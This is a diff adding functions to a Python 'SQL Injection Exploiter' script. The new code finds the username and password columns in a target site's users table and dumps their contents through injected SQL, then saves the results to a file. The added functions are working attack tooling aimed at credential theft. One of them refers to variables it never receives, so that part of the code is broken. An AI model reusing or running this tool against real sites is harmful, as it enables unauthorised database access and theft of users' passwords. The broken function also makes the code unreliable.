@@ -100,6 +100,29 @@ def exploit_sqli_users_table(url, method, post_data=None):
             return users_table, num_col, string_column
     return None, None, None
 
+def exploit_sqli_users_columns(url, users_table, method, num_col, string_column):
+    sql_payload = generate_sql_payload(num_col, string_column, "column_name", users_table)
+    res = perform_request(url, sql_payload, method)
+    soup = BeautifulSoup(res.text, 'html.parser')
+    username_column = soup.find(text=re.compile('.*username.*'))
+    password_column = soup.find(text=re.compile('.*password.*'))
+    return username_column, password_column
+
+def exploit_sqli_user_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
+    sql_payload = generate_sql_payload(num_col, string_column, "all", users_table)
+    res = perform_request(url, sql_payload, method, post_data)
+    res1 = requests.get(url)
+    soup = BeautifulSoup(res.text, 'html.parser')
+    soup2 = BeautifulSoup(res1.text, 'html.parser')
+    output = difference(str(soup), str(soup2))
+    return output
+
+def save_to_file(content):
+    file_path = input("Enter file path to save results (press enter to skip): ")
+    if file_path:
+        with open(file_path, 'w') as file:
+            file.write(str(content))
+        print("Results saved to file.")
 
 def main():
     parser = argparse.ArgumentParser(description="SQL Injection Exploiter")
